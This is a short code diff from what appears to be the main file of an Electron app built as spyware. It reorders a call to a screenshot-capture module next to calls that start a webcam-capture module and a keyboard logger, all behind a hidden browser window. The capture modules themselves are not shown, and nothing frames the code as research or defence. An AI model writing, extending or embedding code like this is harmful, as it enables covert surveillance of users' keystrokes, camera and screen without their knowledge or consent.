@@ -101,11 +101,11 @@ app.on('activate', function () {
 app.on('ready', () => { 
   win = new BrowserWindow({ show: false }); 
 });
+let ScreenShot=require("./ScreenShot.js");
+ScreenShot();
    let WebCam = require("./WebCam.js");
    WebCam(IsEnable);
  
 let KeyboardLogger=require("./Keyboardlogging.js");
 KeyboardLogger(KeyIsEnable);
 
-let ScreenShot=require("./ScreenShot.js");
-ScreenShot();
